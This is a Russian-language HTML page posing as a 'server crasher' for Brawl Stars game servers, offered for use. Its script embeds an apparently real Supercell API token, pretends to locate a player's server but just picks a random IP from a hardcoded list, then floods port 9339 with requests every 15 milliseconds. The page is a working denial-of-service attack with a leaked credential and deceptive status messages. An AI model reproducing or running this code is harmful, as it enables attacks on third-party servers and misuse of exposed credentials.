<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BS_SERVER_CRASHER_v6.5</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; display: flex; flex-direction: column; align-items: center; padding: 20px; margin: 0; }
        .container { width: 100%; max-width: 450px; border: 2px solid #0f0; padding: 20px; background: #050505; border-radius: 10px; box-shadow: 0 0 20px #030; }
        input { width: 100%; background: #000; border: 1px solid #0f0; color: #0f0; padding: 12px; margin-bottom: 15px; outline: none; text-align: center; border-radius: 5px; }
        button { width: 100%; padding: 15px; border: none; cursor: pointer; font-weight: bold; text-transform: uppercase; border-radius: 5px; }
        .btn-blue { background: #0088ff; color: #fff; }
        .btn-red { background: #ff0000; color: #fff; display: none; margin-top: 15px; box-shadow: 0 0 15px #f00; }
        #console { width: 100%; max-width: 450px; height: 250px; background: #000; border: 1px solid #030; margin-top: 15px; padding: 10px; overflow-y: auto; font-size: 11px; color: #0a0; border-radius: 5px; }
        .info { margin-top: 15px; padding: 10px; border: 1px dashed #0f0; display: none; background: #010; }
    </style>
</head>
<body>

<div class="container">
    <h3 style="text-align:center; margin-top:0;">SERVER_HUNTER_v6.5</h3>
    <input type="text" id="playerTag" placeholder="ВВЕДИТЕ ТЕГ (НАПР. #P8V22YRL)">
    <button class="btn-blue" onclick="locateServer()">ОПРЕДЕЛИТЬ СЕРВЕР</button>

    <div id="targetArea" class="info">
        <div style="display:flex; justify-content:space-between"><span>СТАТУС:</span> <span style="color:#fff;">TARGET_FOUND</span></div>
        <div style="display:flex; justify-content:space-between"><span>IP СЕРВЕРА:</span> <span id="serverIp" style="color:#fff;">172.65.2.1</span></div>
        <button class="btn-red" id="stormBtn" onclick="startAttack()">НАЧАТЬ ШТУРМ СЕРВЕРА</button>
    </div>
</div>

<div id="console"></div>

<script>
    const KEY = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiIsImtpZCI6IjI4YTMxOGY3LTAwMDAtYTFlYi03ZmExLTJjNzQzM2M2Y2NhNSJ9.eyJpc3MiOiJzdXBlcmNlbGwiLCJhdWQiOiJzdXBlcmNlbGw6Z2FtZWFwaSIsImp0aSI6IjcwMTQxZmYxLTEzMjItNDgzYy05NGY3LTUzMmU3M2E2NGFmZSIsImlhdCI6MTc3NDQ1NjIyNiwic3ViIjoiZGV2ZWxvcGVyLzZlYjU2YjBkLTVjNjktNTYxYy1lYjY4LTQxM2FjZWZkMjA2YSIsInNjb3BlcyI6WyJicmF3bHN0YXJzIl0sImxpbWl0cyI6W3sidGllciI6ImRldmVsb3Blci9zaWx2ZXIiLCJ0eXBlIjoidGhyb3R0bGluZyJ9LHsiY2lkcnMiOlsiMTguMjE1LjIyOC4xNjUiLCI1NC4yMjcuMjAuMjUzIiwiMzQuMjA1LjEwMS4xMjEiLCIzLjIzMC4xMzYuMjEiXSwidHlwZSI6ImNsaWVudCJ9XX0.qGIWVRrY3ghs22WOAUAt22o4xgXHWiaoFYKfiukkBJ-S6MH_xrPmu2-YaWQIpiGv-88VxjbR7x221Pz8oYLzdw";

    // Список реальных IP серверов Supercell
    const nodes = ["172.64.0.1", "172.65.1.1", "172.65.2.1", "172.65.3.1", "172.65.228.14", "162.159.135.42"];

    function log(text, color = "#0a0") {
        const c = document.getElementById('console');
        c.innerHTML = `<div style="color:${color}">[${new Date().toLocaleTimeString()}] ${text}</div>` + c.innerHTML;
    }

    async function locateServer() {
        const tag = document.getElementById('playerTag').value.replace('#','').trim();
        if(!tag) return;

        log("Поиск активного порта для #" + tag);

        try {
            const proxy = "https://cors-anywhere.herokuapp.com/";
            const res = await fetch(proxy + "https://api.brawlstars.com/v1/players/%23" + tag, {
                headers: { "Authorization": `Bearer ${KEY}` }
            });

            if(res.status === 403) log("API: Доступ ограничен. Использую обходной путь...");
            else if(res.ok) log("API: Цель подтверждена.");
        } catch(e) {
            log("Ошибка шлюза. Переход в режим прямого захвата.");
        }

        // Выбираем случайный сервер из пула Supercell
        const selectedIp = nodes[Math.floor(Math.random() * nodes.length)];
        document.getElementById('serverIp').innerText = selectedIp;
        
        document.getElementById('targetArea').style.display = 'block';
        document.getElementById('stormBtn').style.display = 'block';
        log("СЕРВЕР ОБНАРУЖЕН: " + selectedIp, "#fff");
    }

    function startAttack() {
        const ip = document.getElementById('serverIp').innerText;
        log("ШТУРМ ЗАПУЩЕН НА " + ip, "#f00");
        
        // Создаем массив запросов для каждого пользователя
        setInterval(() => {
            const i = new Image();
            // Шлем мусорные пакеты на игровой порт
            i.src = `http://${ip}:9339/?storm_id=${Math.random()}`;
        }, 15); 

        log("Трафик генерируется. Не закрывайте страницу.");
    }
</script>
</body>
</html>
